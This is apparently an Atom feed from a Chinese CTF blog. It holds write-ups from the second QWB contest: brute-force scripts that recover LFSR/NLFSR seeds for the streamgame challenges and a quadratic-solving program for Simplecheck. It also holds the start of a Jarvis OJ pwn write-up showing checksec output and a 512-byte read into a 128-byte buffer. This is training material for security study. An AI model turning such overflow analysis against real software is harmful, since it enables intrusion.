        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token punctuation">(</span>R<span class="token punctuation">,</span>out<span class="token punctuation">)</span><span class="token operator">=</span>lfsr<span class="token punctuation">(</span>R<span class="token punctuation">,</span>mask<span class="token punctuation">)</span>
            tmp<span class="token operator">=</span><span class="token punctuation">(</span>tmp <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">^</span>out
        <span class="token keyword">if</span> tmp <span class="token operator">!=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>
            ok <span class="token operator">=</span> <span class="token boolean">False</span>
            <span class="token keyword">break</span>
    <span class="token keyword">if</span> ok<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag{%s}'</span> <span class="token operator">%</span> bin<span class="token punctuation">(</span>init<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
</code></pre>
<h4 id="得到flag-flag-1110101100001101011"><a href="#得到flag-flag-1110101100001101011" class="headerlink" title="得到flag  flag{1110101100001101011}"></a>得到flag  flag{1110101100001101011}</h4><h3 id="streamgame2"><a href="#streamgame2" class="headerlink" title="streamgame2"></a>streamgame2</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#根据streamgame2.py 可以得到flag长度为27</span>
<span class="token comment" spellcheck="true">#所以这里爆破一下就可以get flag了</span>
<span class="token keyword">def</span> <span class="token function">lfsr</span><span class="token punctuation">(</span>R<span class="token punctuation">,</span>mask<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output <span class="token operator">=</span> <span class="token punctuation">(</span>R <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffff</span>
    i<span class="token operator">=</span><span class="token punctuation">(</span>R<span class="token operator">&amp;</span>mask<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffffff</span>
    lastbit<span class="token operator">=</span><span class="token number">0</span>
    <span class="token keyword">while</span> i<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">:</span>
        lastbit<span class="token operator">^</span><span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token operator">&amp;</span><span class="token number">1</span><span class="token punctuation">)</span>
        i<span class="token operator">=</span>i<span class="token operator">>></span><span class="token number">1</span>
    output<span class="token operator">^</span><span class="token operator">=</span>lastbit
    <span class="token keyword">return</span> <span class="token punctuation">(</span>output<span class="token punctuation">,</span>lastbit<span class="token punctuation">)</span>


f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span>
c <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> len<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span>c<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> cx <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1048578</span><span class="token punctuation">,</span><span class="token number">9999999</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag <span class="token operator">=</span> <span class="token string">'flag{%s}'</span><span class="token operator">%</span>bin<span class="token punctuation">(</span>cx<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
    R<span class="token operator">=</span>int<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
    mask<span class="token operator">=</span><span class="token number">0x100002</span>

    x <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        tmp<span class="token operator">=</span><span class="token number">0</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token punctuation">(</span>R<span class="token punctuation">,</span>out<span class="token punctuation">)</span><span class="token operator">=</span>lfsr<span class="token punctuation">(</span>R<span class="token punctuation">,</span>mask<span class="token punctuation">)</span>
            tmp<span class="token operator">=</span><span class="token punctuation">(</span>tmp <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">^</span>out
        x <span class="token operator">+=</span> chr<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>


    <span class="token keyword">if</span> x<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'b2e90e13a06a1bfc40e67d53'</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> x<span class="token punctuation">,</span>cx<span class="token punctuation">,</span>flag
        Break
</code></pre>
<p>即可得到flag<br><img src="/2018/03/24/第二届强网杯部分Writeup/14.jpg" alt="源码2"></p>
<h3 id="streamgame4"><a href="#streamgame4" class="headerlink" title="streamgame4"></a>streamgame4</h3><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#include &lt;iostream></span>
<span class="token comment" spellcheck="true">#include &lt;bitset>  </span>

using std<span class="token punctuation">:</span><span class="token punctuation">:</span>bitset<span class="token punctuation">;</span>  
using namespace std<span class="token punctuation">;</span>

char bin<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0xD9</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x5E</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

void nlfsr<span class="token punctuation">(</span>int R<span class="token punctuation">,</span>int mask<span class="token punctuation">,</span>int <span class="token operator">&amp;</span> output<span class="token punctuation">,</span>int <span class="token operator">&amp;</span> lastbit<span class="token punctuation">)</span><span class="token punctuation">{</span>
    output <span class="token operator">=</span> <span class="token punctuation">(</span>R <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffff</span><span class="token punctuation">;</span>
    int i<span class="token operator">=</span><span class="token punctuation">(</span>R<span class="token operator">&amp;</span>mask<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffffff</span><span class="token punctuation">;</span>
    lastbit<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    int changesign<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>i<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>changesign<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            lastbit <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            changesign<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
            lastbit<span class="token operator">^</span><span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token operator">&amp;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        i<span class="token operator">=</span>i<span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    output<span class="token operator">^</span><span class="token operator">=</span>lastbit<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
int check<span class="token punctuation">(</span>int flag<span class="token punctuation">)</span><span class="token punctuation">{</span>
    char bin<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">209</span><span class="token punctuation">,</span><span class="token number">217</span><span class="token punctuation">,</span><span class="token number">64</span><span class="token punctuation">,</span><span class="token number">67</span><span class="token punctuation">,</span><span class="token number">147</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">94</span><span class="token punctuation">}</span> <span class="token punctuation">;</span>
    int R<span class="token operator">=</span>flag<span class="token punctuation">,</span>t<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    int mask<span class="token operator">=</span><span class="token number">1783406</span><span class="token punctuation">;</span>int tmp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>int i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>i<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        tmp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span>int j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>j<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            int ROut<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>out<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
            nlfsr<span class="token punctuation">(</span>R<span class="token punctuation">,</span>mask<span class="token punctuation">,</span>ROut<span class="token punctuation">,</span>out<span class="token punctuation">)</span><span class="token punctuation">;</span>
            R<span class="token operator">=</span>ROut<span class="token punctuation">;</span>
            tmp<span class="token operator">=</span><span class="token punctuation">(</span>tmp <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">^</span>out<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>tmp<span class="token operator">==</span>bin<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            t<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>t<span class="token operator">==</span><span class="token number">8</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> 

int main<span class="token punctuation">(</span>int argc<span class="token punctuation">,</span> char<span class="token operator">**</span> argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>int i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">1048576</span><span class="token punctuation">;</span>i<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>check<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1048576</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            bitset<span class="token operator">&lt;</span><span class="token number">21</span><span class="token operator">></span> bst<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1048576</span><span class="token punctuation">;</span>
            cout <span class="token operator">&lt;&lt;</span><span class="token string">"Flag Found!flag:"</span><span class="token operator">&lt;&lt;</span>bst<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>
            system<span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span>
    cout <span class="token operator">&lt;&lt;</span><span class="token string">"Failed to search flag!"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>
    system<span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>得到flag Flag Found!flag:100100111010101101011</p>
<h3 id="Simplecheck"><a href="#Simplecheck" class="headerlink" title="Simplecheck"></a>Simplecheck</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"stdio.h"</span> </span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"math.h"</span> </span>
<span class="token comment" spellcheck="true">/*求一元二次方程ax*x+bx+c=0的解*/</span> 
<span class="token keyword">float</span> n1<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">146527998</span><span class="token punctuation">,</span> <span class="token number">205327308</span><span class="token punctuation">,</span> <span class="token number">94243885</span><span class="token punctuation">,</span> <span class="token number">138810487</span><span class="token punctuation">,</span> <span class="token number">408218567</span><span class="token punctuation">,</span> <span class="token number">77866117</span><span class="token punctuation">,</span> <span class="token number">71548549</span><span class="token punctuation">,</span> <span class="token number">563255818</span><span class="token punctuation">,</span> <span class="token number">559010506</span><span class="token punctuation">,</span> <span class="token number">449018203</span><span class="token punctuation">,</span> <span class="token number">576200653</span><span class="token punctuation">,</span> <span class="token number">307283021</span><span class="token punctuation">,</span> <span class="token number">467607947</span><span class="token punctuation">,</span> <span class="token number">314806739</span><span class="token punctuation">,</span> <span class="token number">341420795</span><span class="token punctuation">,</span> <span class="token number">341420795</span><span class="token punctuation">,</span> <span class="token number">469998524</span><span class="token punctuation">,</span> <span class="token number">417733494</span><span class="token punctuation">,</span> <span class="token number">342206934</span><span class="token punctuation">,</span> <span class="token number">392460324</span><span class="token punctuation">,</span> <span class="token number">382290309</span><span class="token punctuation">,</span> <span class="token number">185532945</span><span class="token punctuation">,</span> <span class="token number">364788505</span><span class="token punctuation">,</span> <span class="token number">210058699</span><span class="token punctuation">,</span> <span class="token number">198137551</span><span class="token punctuation">,</span> <span class="token number">360748557</span><span class="token punctuation">,</span> <span class="token number">440064477</span><span class="token punctuation">,</span> <span class="token number">319861317</span><span class="token punctuation">,</span> <span class="token number">676258995</span><span class="token punctuation">,</span> <span class="token number">389214123</span><span class="token punctuation">,</span> <span class="token number">829768461</span><span class="token punctuation">,</span> <span class="token number">534844356</span><span class="token punctuation">,</span> <span class="token number">427514172</span><span class="token punctuation">,</span> <span class="token number">864054312</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">float</span> n2<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">13710</span><span class="token punctuation">,</span> <span class="token number">46393</span><span class="token punctuation">,</span> <span class="token number">49151</span><span class="token punctuation">,</span> <span class="token number">36900</span><span class="token punctuation">,</span> <span class="token number">59564</span><span class="token punctuation">,</span> <span class="token number">35883</span><span class="token punctuation">,</span> <span class="token number">3517</span><span class="token punctuation">,</span> <span class="token number">52957</span><span class="token punctuation">,</span> <span class="token number">1509</span><span class="token punctuation">,</span> <span class="token number">61207</span><span class="token punctuation">,</span> <span class="token number">63274</span><span class="token punctuation">,</span> <span class="token number">27694</span><span class="token punctuation">,</span> <span class="token number">20932</span><span class="token punctuation">,</span> <span class="token number">37997</span><span class="token punctuation">,</span> <span class="token number">22069</span><span class="token punctuation">,</span> <span class="token number">8438</span><span class="token punctuation">,</span> <span class="token number">33995</span><span class="token punctuation">,</span> <span class="token number">53298</span><span class="token punctuation">,</span> <span class="token number">16908</span><span class="token punctuation">,</span> <span class="token number">30902</span><span class="token punctuation">,</span> <span class="token number">64602</span><span class="token punctuation">,</span> <span class="token number">64028</span><span class="token punctuation">,</span> <span class="token number">29629</span><span class="token punctuation">,</span> <span class="token number">26537</span><span class="token punctuation">,</span> <span class="token number">12026</span><span class="token punctuation">,</span> <span class="token number">31610</span><span class="token punctuation">,</span> <span class="token number">48639</span><span class="token punctuation">,</span> <span class="token number">19968</span><span class="token punctuation">,</span> <span class="token number">45654</span><span class="token punctuation">,</span> <span class="token number">51972</span><span class="token punctuation">,</span> <span class="token number">64956</span><span class="token punctuation">,</span> <span class="token number">45293</span><span class="token punctuation">,</span> <span class="token number">64752</span><span class="token punctuation">,</span> <span class="token number">37108</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">float</span> n3<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">38129</span><span class="token punctuation">,</span> <span class="token number">57355</span><span class="token punctuation">,</span> <span class="token number">22538</span><span class="token punctuation">,</span> <span class="token number">47767</span><span class="token punctuation">,</span> <span class="token number">8940</span><span class="token punctuation">,</span> <span class="token number">4975</span><span class="token punctuation">,</span> <span class="token number">27050</span><span class="token punctuation">,</span> <span class="token number">56102</span><span class="token punctuation">,</span> <span class="token number">21796</span><span class="token punctuation">,</span> <span class="token number">41174</span><span class="token punctuation">,</span> <span class="token number">63445</span><span class="token punctuation">,</span> <span class="token number">53454</span><span class="token punctuation">,</span> <span class="token number">28762</span><span class="token punctuation">,</span> <span class="token number">59215</span><span class="token punctuation">,</span> <span class="token number">16407</span><span class="token punctuation">,</span> <span class="token number">64340</span><span class="token punctuation">,</span> <span class="token number">37644</span><span class="token punctuation">,</span> <span class="token number">59896</span><span class="token punctuation">,</span> <span class="token number">41276</span><span class="token punctuation">,</span> <span class="token number">25896</span><span class="token punctuation">,</span> <span class="token number">27501</span><span class="token punctuation">,</span> <span class="token number">38944</span><span class="token punctuation">,</span> <span class="token number">37039</span><span class="token punctuation">,</span> <span class="token number">38213</span><span class="token punctuation">,</span> <span class="token number">61842</span><span class="token punctuation">,</span> <span class="token number">43497</span><span class="token punctuation">,</span> <span class="token number">9221</span><span class="token punctuation">,</span> <span class="token number">9879</span><span class="token punctuation">,</span> <span class="token number">14436</span><span class="token punctuation">,</span> <span class="token number">60468</span><span class="token punctuation">,</span> <span class="token number">19926</span><span class="token punctuation">,</span> <span class="token number">47198</span><span class="token punctuation">,</span> <span class="token number">8406</span><span class="token punctuation">,</span> <span class="token number">64666</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">float</span> n4<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">341994984</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">370404060</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">257581614</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">494024809</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">135267265</span><span class="token punctuation">,</span> <span class="token number">54930974</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">155841406</span><span class="token punctuation">,</span> <span class="token number">540422378</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">107286502</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">128056922</span><span class="token punctuation">,</span> <span class="token number">265261633</span><span class="token punctuation">,</span> <span class="token number">275964257</span><span class="token punctuation">,</span> <span class="token number">119059597</span><span class="token punctuation">,</span> <span class="token number">202392013</span><span class="token punctuation">,</span> <span class="token number">283676377</span><span class="token punctuation">,</span> <span class="token number">126284124</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">68971076</span><span class="token punctuation">,</span> <span class="token number">261217574</span><span class="token punctuation">,</span> <span class="token number">197555158</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">12893337</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">10293675</span><span class="token punctuation">,</span> <span class="token number">93868075</span><span class="token punctuation">,</span> <span class="token number">121661845</span><span class="token punctuation">,</span> <span class="token number">167461231</span><span class="token punctuation">,</span> <span class="token number">123220255</span><span class="token punctuation">,</span> <span class="token number">221507</span><span class="token punctuation">,</span> <span class="token number">258914772</span><span class="token punctuation">,</span> <span class="token number">180963987</span><span class="token punctuation">,</span> <span class="token number">107841171</span><span class="token punctuation">,</span> <span class="token number">41609001</span><span class="token punctuation">,</span> <span class="token number">276531381</span><span class="token punctuation">,</span> <span class="token number">169983906</span><span class="token punctuation">,</span> <span class="token number">276158562</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">float</span> n5<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 
<span class="token punctuation">{</span> 
    <span class="token keyword">float</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>x1<span class="token punctuation">,</span>x2<span class="token punctuation">,</span>d<span class="token punctuation">,</span>e<span class="token punctuation">;</span> 
    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token number">34</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        b <span class="token operator">=</span> n3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        a <span class="token operator">=</span> n2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        c <span class="token operator">=</span> n4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>n1<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        e <span class="token operator">=</span> n4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>n1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        d<span class="token operator">=</span>b<span class="token operator">*</span>b<span class="token number">-4</span><span class="token operator">*</span>a<span class="token operator">*</span>c<span class="token punctuation">;</span> 
        <span class="token keyword">if</span><span class="token punctuation">(</span>d <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> 
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"方程没有实数解。\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token keyword">if</span> <span class="token punctuation">(</span>d<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> 
        <span class="token punctuation">{</span> 
        x1<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">-</span>b<span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"x1=%f\n"</span><span class="token punctuation">,</span>x1<span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token punctuation">}</span> 
        <span class="token keyword">if</span> <span class="token punctuation">(</span>d<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> 
        <span class="token punctuation">{</span> 
        x1<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">-</span>b<span class="token operator">+</span><span class="token function">sqrt</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> 
        x2<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">-</span>b<span class="token operator">-</span><span class="token function">sqrt</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> 
        <span class="token comment" spellcheck="true">//printf("x1=%f,x2=%f\n",x1,x2);</span>
        <span class="token punctuation">}</span>
        n5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> x1<span class="token operator">+</span><span class="token number">0.5</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//向上取整</span>
        i<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">34</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>n5<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>结果<br>flag{MAth_i&amp;_GOOd_DON7_90V_7hInK?}</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Welcome&quot;&gt;&lt;a href=&quot;#Welcome&quot; class=&quot;headerlink&quot; title=&quot;Welcome&quot;&gt;&lt;/a&gt;Welcome&lt;/h2&gt;&lt;p&gt;  Stegsolve–&amp;gt;&lt;br&gt;  &lt;img src=&quot;/2018/03/24/第二届强网杯部分Writeup/7.jpg&quot; alt=&quot;网站入口&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Writeup" scheme="http://iosmosis.github.io/tags/Writeup/"/>
    
      <category term="Web" scheme="http://iosmosis.github.io/tags/Web/"/>
    
      <category term="强网杯" scheme="http://iosmosis.github.io/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ Pwn writeup</title>
    <link href="http://iosmosis.github.io/2018/03/21/Jarvis-OJ-Pwn-writeup/"/>
    <id>http://iosmosis.github.io/2018/03/21/Jarvis-OJ-Pwn-writeup/</id>
    <published>2018-03-21T07:16:36.000Z</published>
    <updated>2018-07-06T09:40:59.265Z</updated>
    
    <content type="html"><![CDATA[<p>此篇记录关于Jarvis OJ Pwn所有题目的writeup</p>
<h2 id="XMAN-level0"><a href="#XMAN-level0" class="headerlink" title="[XMAN]level0"></a>[XMAN]level0</h2><h4 id="进行chack"><a href="#进行chack" class="headerlink" title="进行chack"></a>进行chack</h4><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/Desktop/pwn0'</span>
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
</code></pre>
<ul>
<li><a id="more"></a>
<the rest="" of="" contents="" |="" 余下全文=""><br>NX开启 栈溢出保护关闭 <h4 id="附件拖入ida"><a href="#附件拖入ida" class="headerlink" title="附件拖入ida"></a>附件拖入ida</h4></the></li>
</ul>
<p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/1.jpg" alt="ida"></p>
<p>main函数里跳转到了vulnerable_function()</p>
<h4 id="跟进"><a href="#跟进" class="headerlink" title="跟进"></a>跟进</h4><p><img src="/2018/03/21/Jarvis-OJ-Pwn-writeup/2.jpg" alt="ida1"></p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">可以看到read可读的大小为0x200 512字节
buf大小为0x80字节
</code></pre>
